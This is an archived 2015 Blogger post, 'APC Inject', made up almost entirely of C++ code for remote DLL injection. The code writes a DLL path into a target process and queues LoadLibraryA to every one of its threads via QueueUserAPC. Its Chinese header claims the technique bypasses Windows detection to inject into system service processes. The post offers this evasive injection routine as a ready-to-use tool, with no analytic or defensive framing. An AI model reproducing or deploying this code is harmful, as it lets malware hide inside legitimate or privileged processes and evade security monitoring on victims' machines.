---
layout: post
title: APC Inject
date: '2015-02-09T06:08:00.000-08:00'
author: 聖豪馬
tags: 
modified_time: '2015-02-11T00:41:48.342-08:00'
blogger_id: tag:blogger.com,1999:blog-1335849442109808564.post-8096855874454136085
blogger_orig_url: http://helloadr.blogspot.com/2015/02/apc-inject.html
---

<div style="background-color: white; color: #141823; font-family: Helvetica, Arial, 'lucida grande', tahoma, verdana, arial, sans-serif; font-size: 15px; line-height: 23.0000019073486px; margin-bottom: 6px;">// APC線程挾持遠程注入 By.aaaddress1.<br />// 可繞過Windows檢測注入系統服務進程</div><div style="background-color: white; color: #141823; font-family: Helvetica, Arial, 'lucida grande', tahoma, verdana, arial, sans-serif; font-size: 15px; line-height: 23.0000019073486px; margin-bottom: 6px; margin-top: 6px;">long InjectThreadDLL(DWORD PID,String Path){<br />void* hd ;<span class="text_exposed_show" style="display: inline;"><br />HANDLE hThreadSnap = NULL;<br />THREADENTRY32 te32 = {0};<br />char *DllName;</span></div><div class="text_exposed_show" style="background-color: white; color: #141823; display: inline; font-family: Helvetica, Arial, 'lucida grande', tahoma, verdana, arial, sans-serif; font-size: 15px; line-height: 23.0000019073486px;"><div style="margin-bottom: 6px;">hd = OpenProcess(PROCESS_ALL_ACCESS,false,PID);</div><div style="margin-bottom: 6px; margin-top: 6px;">DllName = AnsiString(Path).c_str() ;<br />int len = strlen(DllName) + 1;<br />PVOID param = VirtualAllocEx(hd, NULL, len,MEM_COMMIT | MEM_TOP_DOWN,PAGE_READWRITE);<br />if (param == NULL) return false;<br />WriteProcessMemory(hd, param,(LPVOID)DllName, len, 0);</div><div style="margin-bottom: 6px; margin-top: 6px;">hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, PID);<br />if (hThreadSnap == INVALID_HANDLE_VALUE)return (FALSE);<br />te32.dwSize = sizeof(THREADENTRY32);</div><div style="margin-bottom: 6px; margin-top: 6px;">if (Thread32First(hThreadSnap, &amp;te32))<br />{<br />do<br />{<br />if (te32.th32OwnerProcessID == PID)<br />{<br />HMODULE Kernel32ADR = GetRemoteModuleHandle(PID,AnsiString("Kernel32.dll").c_str());</div><div style="margin-bottom: 6px; margin-top: 6px;">if (Kernel32ADR != NULL) {<br />FARPROC LoadLibraryADR = GetProcAddress(Kernel32ADR, "LoadLibraryA");<br />HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, 0, te32.th32ThreadID);<br />if (hThread != 0)<br />{<br />QueueUserAPC((PAPCFUNC)LoadLibraryADR,hThread,(DWORD)param);<br />CloseHandle(hThread);<br />}<br />}<br />}<br />}<br />while (Thread32Next(hThreadSnap, &amp;te32));<br />return ((long)hd);</div><div style="margin-bottom: 6px; margin-top: 6px;">}else{<br />CloseHandle (hThreadSnap);<br />return false;<br />}<br />}</div></div>